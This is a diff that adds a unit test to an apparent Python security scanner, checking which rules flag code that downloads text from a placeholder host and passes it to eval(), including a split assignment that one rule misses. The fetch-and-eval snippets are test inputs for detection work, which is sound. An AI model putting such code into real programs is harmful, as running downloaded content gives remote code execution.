@@ -54,6 +54,17 @@ class PythonAnalysisTests(unittest.TestCase):
         self.assertEqual(correlation[0]["source"]["location"]["start"]["line"], 2)
         self.assertNotIn("PY-004", {f.rule_id for f in scan(common + "x = 'fixed'\nexec(x)\n").findings})
 
+    def test_network_attribute_through_second_assignment_is_outside_py004_coverage(self):
+        split = ('response = requests.get("https://example.invalid/sample")\n'
+                 'payload = response.text\neval(payload)\n')
+        for source in (split, "import requests\n" + split):
+            with self.subTest(source=source):
+                report = scan(source)
+                self.assertTrue(report.complete)
+                self.assertEqual([finding.rule_id for finding in report.findings], ["PY-001"])
+        direct = 'import requests\npayload = requests.get("https://example.invalid/sample").text\neval(payload)\n'
+        self.assertEqual({finding.rule_id for finding in scan(direct).findings}, {"PY-001", "PY-004"})
+
     def test_unicode_positions_and_empty_file(self):
         result = scan("é = 1; eval('x')\n")
         finding = next(f for f in result.findings if f.rule_id == "PY-001")
